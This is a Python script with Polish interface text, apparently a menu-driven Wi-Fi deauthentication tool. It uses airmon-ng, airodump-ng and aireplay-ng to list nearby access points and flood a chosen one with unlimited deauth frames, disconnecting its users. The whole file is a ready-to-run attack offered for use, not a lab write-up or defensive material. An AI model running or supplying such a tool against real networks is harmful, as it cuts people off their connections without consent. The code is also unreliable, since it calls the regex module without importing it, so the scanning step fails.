import os
import subprocess
import sys

def get_active_interface():
    interface_name = subprocess.getoutput("ip link | grep -Eo '^[0-9]+: wl[^:]+' | awk -F': ' '{print $2}' | tr -d ':'")
    interface_name = interface_name.strip()  # Usuwanie białych znaków
    return interface_name

def press_to_continue():
    input("Naciśnij Enter, aby kontynuować...")

def start_monitor_mode(interface_name):
    # Uruchomienie trybu monitorowania
    os.system(f"sudo airmon-ng check kill && clear")
    os.system("echo ==================")
    os.system("echo -  WiFiDeauther  -")
    os.system("echo ==================")
    os.system(f"sudo airmon-ng start {interface_name}")

    # Ponowne sprawdzenie dostępnych interfejsów sieciowych, aby znaleźć aktualną nazwę interfejsu w trybie monitorowania
    updated_interface_name = subprocess.getoutput("ip link | grep -Eo '^[0-9]+: wl[^:]+' | awk -F': ' '{print $2}' | tr -d ':'").strip()

    return updated_interface_name

def capture_bssid(interface_name):
    # Wykonanie airodump-ng i przechwycenie wyników bezpośrednio do zmiennej
    airodump_output = subprocess.getoutput(f"sudo timeout 5 airodump-ng {interface_name}")

    # Inicjalizacja listy do przechowywania danych BSSID
    bssid_data = []

    # Przetwarzanie wyników airodump-ng, linia po linii
    for line in airodump_output.split('\n'):
        if re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line):
            # Przetwarzanie linii zawierających BSSID
            columns = line.split()
            if len(columns) >= 14:  # Sprawdzenie, czy linia zawiera wymagane dane
                bssid = columns[0]
                channel = columns[5]
                ssid = ' '.join(columns[13:])  # SSID może zawierać spacje
                bssid_data.append([bssid, channel, ssid])

    return bssid_data

def set_channel(interface_name, channel):
    os.system(f"sudo iw {interface_name} set channel {channel}")

def deauth_attack(interface_name, bssid):
    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}")

def stop_monitor_mode(interface_name):
    os.system(f"sudo airmon-ng stop {interface_name}")
    os.system("sudo systemctl restart NetworkManager")

def main():
    interface_name = get_active_interface()
    interface_name = start_monitor_mode(interface_name)
    bssid_data = []

    while True:
        print("\n1) Przechwyc BSSID.")
        print("2) Wybierz kanał.")
        print("3) Atak deauth.")
        print("0) Zakończ działanie programu.")

        choice = input("Wybierz opcję: ")

        if choice == "1":
            bssid_data = capture_bssid(interface_name)  # Przechwytywanie danych do zmiennej
            for index, (bssid, channel, ssid) in enumerate(bssid_data):
                print(f"{index + 1}) BSSID: {bssid}, Kanał: {channel}, SSID: {ssid}")
            press_to_continue()

        elif choice == "2":
            channel = input("Wpisz numer kanału, na którym chcesz przeprowadzić atak deauth: ")
            set_channel(interface_name, channel)
            press_to_continue()
        elif choice == "3":
            if not bssid_data:  # Sprawdzenie, czy lista bssid_data jest pusta
                print("Najpierw wykonaj przechwycenie BSSID (opcja 1).")
            else:
                for index, (bssid, channel, ssid) in enumerate(bssid_data):
                    print(f"{index + 1}) BSSID: {bssid}, Kanał: {channel}, SSID: {ssid}")
                bssid_index = int(input("Wybierz numer BSSID, na którym chcesz przeprowadzić atak deauth: ")) - 1
                bssid = bssid_data[bssid_index][0]  # Pobranie BSSID na podstawie wyboru użytkownika
                deauth_attack(interface_name, bssid)
                press_to_continue()
        elif choice == "0":
            stop_monitor_mode(interface_name)
            ## os.system("rm bssid.txt")
            print("Wyjście.")
            break
        else:
            print("Nieprawidłowy wybór. Wybierz jeszcze raz, badź wybierz '0' aby wyjść!.")
            press_to_continue()

if __name__ == "__main__":
    main()
